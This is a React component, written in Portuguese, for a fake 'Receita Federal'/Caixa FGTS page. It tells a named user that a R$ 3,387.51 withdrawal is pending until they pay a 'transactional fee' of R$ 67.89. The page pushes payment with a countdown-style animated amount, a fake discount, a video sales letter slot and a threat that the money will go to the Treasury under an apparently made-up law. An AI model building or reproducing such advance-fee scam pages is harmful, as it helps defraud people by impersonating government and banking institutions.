import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { IoIosWarning } from "react-icons/io";
import { HiChevronRight } from "react-icons/hi";

export function PagamentoTarifa() {
    useEffect(() => {
        document.title = "Pagamento da Tarifa - Receita Federal";
    }, []);

    const [activeIndex, setActiveIndex] = useState<number | null>(null);
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const totalAmount = 3387.51; // Valor total

    // Função para alternar perguntas
    const toggleQuestion = (index: number) => {
        setActiveIndex(activeIndex === index ? null : index);
    };

    // Perguntas frequentes
    const questions = [
        "Por que é cobrado uma taxa de R$ 67,89?",
        "Por que vocês não descontam a taxa do meu saque?",
        "Quais são as formas de pagamento?",
        "Como faço para sacar rápido sem esperar as 2 horas?",
        "Qual a garantia que tenho para efetuar o saque dos valores bloqueados?",
        "Como posso acompanhar meu pedido de saque?",
    ];

    // Animação do valor
    useEffect(() => {
        let start = 0;
        const end = totalAmount;
        const duration = 10000; // Duração da animação em milissegundos
        const incrementTime = duration / end; // Tempo para cada incremento

        const intervalId = setInterval(() => {
            if (start < end) {
                start++;
                setDisplayedAmount(start);
            } else {
                clearInterval(intervalId);
            }
        }, incrementTime);

        return () => clearInterval(intervalId);
    }, [totalAmount]);

    return (
        <div className="flex flex-col items-center justify-center w-full min-h-screen bg-white pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 bg-[#025bab] text-white mb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, VICTOR</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="px-4">
                <div className="flex flex-col items-center w-full max-w-lg px-2 bg-white shadow-lg rounded-lg space-y-4">
                    <div className="flex items-center pt-4">
                        <IoIosWarning className="text-orange-500 mr-2" size={36} />
                        <h2 className="text-3xl font-bold text-orange-500">ATENÇÃO!</h2>
                    </div>

                    <h2 className="text-4xl font-bold text-center text-gray-800 mt-2">
                        Seu saque <br />de <span className="text-primary ">R$ {displayedAmount.toFixed(2)}</span> <br />está <span className="text-orange-500">pendente</span>
                    </h2>
                    <div className="text-2xl font-semibold text-center text-gray-700 mt-2">
                        Aguardando pagamento da <span className="text-green-600">Tarifa Transacional</span>
                    </div>
                    <p className="text-gray-600 text-center">
                        Assista o vídeo abaixo para saber mais sobre a taxa
                    </p>

                    {/* VSL (Video Sales Letter) */}
                    <div className="bg-gray-100 w-full h-48 rounded-lg flex items-center justify-center mb-4">
                        <span className="text-gray-500">[Vídeo aqui]</span>
                    </div>

                    <div className="text-center space-y-2">
                        <h3 className="text-lg font-thin text-zinc-700">
                            Pague a tarifa para receber seu FGTS em até <span className="text-green-600 font-semibold">3 minutos!</span>
                        </h3>
                        <p className="text-gray-600">Pague hoje com desconto de:</p>
                        <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por apenas: </p>
                        <p className="text-3xl font-extrabold text-green-700">R$ 67,89</p>
                    </div>

                    <p className="text-gray-600 text-center mt-4">
                        Clique no botão abaixo para realizar o pagamento da tarifa transacional e receber o seu saque!
                    </p>

                    <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
                        Realizar Pagamento
                    </button>

                    <div>
                        <p className="text-zinc-400 font-semibold text-center mt-4 text-sm">
                            AVISO IMPORTANTE: Seu saque já está em processo de liberação, basta seguir para próxima página e concluir o pagamento da tarifa transacional, caso você não conclua o valor disponível será imediatamente bloqueado e disponibilizado ao Tesouro Nacional conforme lei 1.847/24!
                        </p>

                        <h3 className="text-lg font-semibold text-center text-gray-800 mt-10 mb-10">
                            SOMENTE APÓS A <span className="text-green-600">CONFIRMAÇÃO DO PAGAMENTO</span> DESTA TAXA, O SEU SAQUE SERÁ CONCLUÍDO!
                        </h3>

                    </div>
                    <h4 className="text-lg font-semibold text-gray-800 mt-4">DÚVIDAS FREQUENTES</h4>
                    <div className="w-full">
                        {questions.map((question, index) => (
                            <div key={index} className="border-b">
                                <button
                                    className="flex justify-between w-full text-left py-2 text-gray-700 hover:text-gray-900 focus:outline-none"
                                    onClick={() => toggleQuestion(index)}
                                >
                                    <h5 className="font-semibold">{question}</h5>
                                    <HiChevronRight
                                        className={`transform transition-transform duration-300 ${activeIndex === index ? 'rotate-90' : ''}`}
                                        size={24}
                                    />
                                </button>
                                <div
                                    className={`overflow-hidden transition-all duration-300 ${activeIndex === index ? 'max-h-40' : 'max-h-0'}`}
                                >
                                    <p className="text-gray-600 text-sm mb-2 p-2">
                                        Esta é a resposta à pergunta: "{question}".
                                    </p>
                                </div>
                            </div>
                        ))}

                    </div>

                    <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
                        Realizar Pagamento
                    </button>
                </div>
            </div>
        </div>
    );
}
